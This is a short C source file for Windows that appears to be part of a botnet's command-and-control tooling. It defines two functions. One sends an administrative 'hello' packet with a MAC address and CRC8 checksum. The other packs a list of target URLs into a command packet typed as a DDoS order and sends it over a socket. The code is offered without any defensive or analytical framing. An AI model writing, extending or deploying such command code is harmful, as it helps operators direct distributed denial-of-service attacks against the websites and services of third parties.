#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <stdint.h>

#include "packet_defs.h"
#include "packet.h"
#include "crc.h"

#pragma comment(lib, "ws2_32.lib")

int hello_packet(SOCKET sock, const uint8_t* mac) {
    HelloPacket pkt;
    pkt.size = sizeof(HelloPacket);
    pkt.version = TCP_VERSION;
    pkt.type = ADMIN_PACKET_HELLO_TYPE;
    memcpy(pkt.mac, mac, 6);

    pkt.crc = crc8_xor((uint8_t*)&pkt, sizeof(HelloPacket) - 1);

    int sent = send(sock, (const char*)&pkt, sizeof(HelloPacket), 0);
    return sent;
}


int ddos_packet(SOCKET sock, const char *urls) {
    if (urls == NULL) {
        return -1;
    }

    size_t cmd_len = strlen(urls);

    size_t header_len = offsetof(DDOSPacket, urls);
    size_t pkt_len = header_len + cmd_len;

    uint8_t *buffer = malloc(pkt_len);
    if (!buffer) {
        return -1;
    }

    DDOSPacket *pkt = (DDOSPacket*)buffer;
    pkt->size = (uint16_t)pkt_len;
    pkt->version = TCP_VERSION;
    pkt->type = ADMIN_PACKET_TYPE_COMMAND;
    pkt->c_type = ADMIN_PACKET_CTYPE_COMMAND_DDOS;
    pkt->crc = 0;

    if (cmd_len) {
        memcpy(buffer + header_len, urls, cmd_len);
    }

    uint8_t crc = crc8_xor(buffer, pkt_len - 1);
    pkt->crc = crc;

    int sent = send(sock, (const char*)buffer, (int)pkt_len, 0);

    free(buffer);
    return sent;
}
